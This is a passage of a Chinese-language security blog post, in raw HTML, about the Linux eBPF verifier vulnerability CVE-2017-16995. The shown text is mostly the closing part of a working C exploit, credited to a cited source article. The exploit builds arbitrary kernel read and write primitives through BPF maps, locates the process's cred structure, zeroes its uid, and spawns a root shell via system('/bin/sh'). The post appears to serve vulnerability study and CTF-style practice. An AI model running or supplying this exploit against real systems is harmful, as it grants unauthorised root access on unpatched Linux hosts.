map_type,</span><br><span class="line">		.key_size = key_size,</span><br><span class="line">		.value_size = value_size,</span><br><span class="line">		.max_entries = max_entries&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">uint64_t</span> key, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">		.map_fd = mapfd,</span><br><span class="line">		.key = (__u64)&amp;key,</span><br><span class="line">		.value = (__u64)&amp;value,</span><br><span class="line">		.flags = <span class="number">0</span>,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">		.map_fd = mapfd,</span><br><span class="line">		.key = (__u64)key,</span><br><span class="line">		.value = (__u64)value,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;error: %s\n&quot;</span>, err);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prep</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);</span><br><span class="line">	<span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;mapfd finished&quot;</span>);</span><br><span class="line">	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">						   (struct bpf_insn *)__prog, PROGSIZE, <span class="string">&quot;GPL&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;bpf_prog_load finished&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;socketpair finished&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;setsockopt finished&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">ssize_t</span> n = write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(buffer))</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write: %lu\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __update_elem(a, b, c) \</span></span><br><span class="line"><span class="meta">	bpf_update_elem(0, (a));   \</span></span><br><span class="line"><span class="meta">	bpf_update_elem(1, (b));   \</span></span><br><span class="line"><span class="meta">	bpf_update_elem(2, (c));   \</span></span><br><span class="line"><span class="meta">	writemsg();</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint64_t</span> value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">		__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	__update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __read(<span class="keyword">uint64_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">	__update_elem(<span class="number">0</span>, addr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __write(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> val)</span><br><span class="line">&#123;</span><br><span class="line">	__update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_sp</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> addr &amp; ~(<span class="number">0x4000</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">uint64_t</span> fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">	fp = __get_fp();</span><br><span class="line">	<span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus fp&quot;</span>);</span><br><span class="line"></span><br><span class="line">	sp = get_sp(fp);</span><br><span class="line">	<span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus sp&quot;</span>);</span><br><span class="line"></span><br><span class="line">	task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus task ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;task_struct = %lx\n&quot;</span>, task_struct);</span><br><span class="line"></span><br><span class="line">	credptr = __read(task_struct + CRED_OFFSET); <span class="comment">// cred</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus cred ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">	uidptr = credptr + UID_OFFSET; <span class="comment">// uid</span></span><br><span class="line">	<span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">		__exit(<span class="string">&quot;bogus uid ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;uidptr = %lx\n&quot;</span>, uidptr);</span><br><span class="line">	__write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;spawning root shell\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	__exit(<span class="string">&quot;not vulnerable?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	prep();</span><br><span class="line">	pwn();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="/images/image-20221010170323134.png"  alt="image-20221010170323134"></p>
<p>è¿™é‡Œexpæˆ‘æ˜¯ç›´æ¥ç”¨çš„åŸæ–‡çš„expï¼Œå› ä¸ºç†è§£æ¼æ´ä¹‹åæ“ä½œèµ·æ¥å°±æ¯”è¾ƒç®€å•äº†ï¼Œä¸»è¦éº»çƒ¦çš„å°±æ˜¯æ„é€ eBPFæŒ‡ä»¤</p>
<hr>
<p>é¢˜ç›®æ”¾åœ¨:<a class="link"   target="_blank" rel="noopener" href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p>
<p>å‚è€ƒæ–‡ç« :<a class="link"   target="_blank" rel="noopener" href="http://p4nda.top/2019/01/18/CVE-2017-16995/#do-check" >http://p4nda.top/2019/01/18/CVE-2017-16995/#do-check<i class="fas fa-external-link-alt"></i></a></p>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/ebpf/">ebpf</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2022/10/16/practice%E2%85%A0/"
                                   title="practice â… "
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">practice â… </span>
                                        <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2022/10/02/Linux-kernel-4-20-BPF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"
                                   title="Linux kernel 4.20 BPF æ•´æ•°æº¢å‡ºæ¼æ´"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">Linux kernel 4.20 BPF æ•´æ•°æº¢å‡ºæ¼æ´</span>
                                        <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    


    <div class="comments-container border-box">
        <div id="comments-anchor" class="comment-area-title border-box">
            <i class="fas fa-comments"></i>&nbsp;è¯„è®º
        </div>
        <div class="comment-plugin-fail border-box">
    <span class="fail-tip">è¯„è®ºæ’ä»¶åŠ è½½å¤±è´¥</span>
    <button class="reload keep-button">ç‚¹å‡»é‡æ–°åŠ è½½</button>
</div>
<div class="comment-plugin-loading flex-center border-box">
    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
    <span class="load-tip">æ­£åœ¨åŠ è½½è¯„è®ºæ’ä»¶</span>
</div>
<script data-pjax>
  window.KeepCommentPlugin = {}
  window.KeepCommentPlugin.hideLoading = () => {
    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
    cplDom.style.display = 'none'
  }
  window.KeepCommentPlugin.loadFailHandle = () => {
    window.KeepCommentPlugin.hideLoading()
    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
    cpfDom.style.display = 'flex'
    cpfDom.querySelector('.reload').addEventListener('click', () => {
      window.location.reload()
    })
  }
</script>

        
            

    <div class="valine-container">
        <div id="vcomments"></div>
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
                async
                onerror="window.KeepCommentPlugin.loadFailHandle()"
        ></script>
        <script 
                async
                onerror="window.KeepCommentPlugin.loadFailHandle()"
        >
          window.KeepCommentPlugin.initValine = () => {
            const config = {
              el: '#vcomments',
              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
              appKey: 'C672AAYGXMkHxztf8ntdLShs',
              meta: ['nick', 'mail', 'link'],
              avatar: 'wavatar',
              enableQQ: true,
              placeholder: 'ğŸ˜œè‹¥æœ‰é—®é¢˜è¯·å„ä½å¤§å¸ˆå‚…ç•™è¨€è¯„è®ºï¼ˆç•™ä¸‹é‚®ç®±æœ‰é€šçŸ¥å“¦ï½ï¼‰',
              lang: 'zh-CN'.toLowerCase()
            }

            if ('') {
              config.serverURLs = ''
            }

            if (window?.Valine) {
              new Valine(config)
              window.KeepCommentPlugin.hideLoading()
            } else {
              setTimeout(() => {
                window.KeepCommentPlugin.initValine()
              }, 1000)
            }
          }

          if ('false' === 'true') {
            setTimeout(() => {
              window.KeepCommentPlugin.initValine()
            }, 1200)
          } else {
            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
          }
        </script>
    </div>


        
    </div>





                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-text">æ¼æ´ç®€ä»‹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eBPF%E6%8C%87%E4%BB%A4%E9%9B%86%E4%BB%8B%E7%BB%8D"><span class="nav-text">eBPFæŒ‡ä»¤é›†ä»‹ç»</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eBPF%E4%BB%A3%E7%A0%81%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B-%E6%A3%80%E6%9F%A5%E5%88%86%E6%9E%90"><span class="nav-text">eBPFä»£ç åŠ è½½æ‰§è¡Œæµç¨‹ &amp; æ£€æŸ¥åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="nav-text">åŠ è½½æ‰§è¡Œæµç¨‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E5%88%86%E6%9E%90"><span class="nav-text">æ£€æŸ¥åˆ†æ</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">æ¼æ´åˆ†æ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">æ¼æ´åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%80%E5%87%BAdo-check"><span class="nav-text">é€€å‡ºdo_check</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-text">å®ç°ä»»æ„åœ°å€è¯»å†™</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8Cexp"><span class="nav-text">ç»¼ä¸Šï¼Œexp</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
        
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
        
    </div>

    <div class="theme-info info-item">
        ç”±&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;é©±åŠ¨&nbsp;&&nbsp;ä¸»é¢˜&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    
        
        <div class="deploy-info info-item">
            
            æœ¬ç«™ç”± <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> æä¾›éƒ¨ç½²æœåŠ¡
            
        </div>
    

    
        <div class="count-info info-item">
            
                <span class="count-item border-box word">
                    <span class="item-type border-box">æ€»å­—æ•°</span>
                    <span class="item-value border-box word">335.6k</span>
                </span>
            

            
                <span class="count-item border-box uv">
                    <span class="item-type border-box">è®¿å®¢æ•°</span>
                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
                </span>
            

            
                <span class="count-item border-box pv">
                    <span class="item-type border-box">è®¿é—®é‡</span>
                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
                </span>
            
        </div>
    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- PC go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        
            <li class="tools-item toggle-show-toc-tablet flex-center">
                <i class="fas fa-list"></i>
            </li>
        

        
            <li class="tools-item go-to-comments-tablet flex-center">
                <i class="fas fa-comment"></i>
            </li>
        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-text">æ¼æ´ç®€ä»‹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eBPF%E6%8C%87%E4%BB%A4%E9%9B%86%E4%BB%8B%E7%BB%8D"><span class="nav-text">eBPFæŒ‡ä»¤é›†ä»‹ç»</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eBPF%E4%BB%A3%E7%A0%81%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B-%E6%A3%80%E6%9F%A5%E5%88%86%E6%9E%90"><span class="nav-text">eBPFä»£ç åŠ è½½æ‰§è¡Œæµç¨‹ &amp; æ£€æŸ¥åˆ†æ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="nav-text">åŠ è½½æ‰§è¡Œæµç¨‹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5%E5%88%86%E6%9E%90"><span class="nav-text">æ£€æŸ¥åˆ†æ</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">æ¼æ´åˆ†æ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">æ¼æ´åˆ©ç”¨</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%80%E5%87%BAdo-check"><span class="nav-text">é€€å‡ºdo_check</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-text">å®ç°ä»»æ„åœ°å€è¯»å†™</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8Cexp"><span class="nav-text">ç»¼ä¸Šï¼Œexp</span></a></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>





<!-- common js -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>

<!-- local search -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>


<!-- lazyload -->

    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>

        <!-- toc -->
        
            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
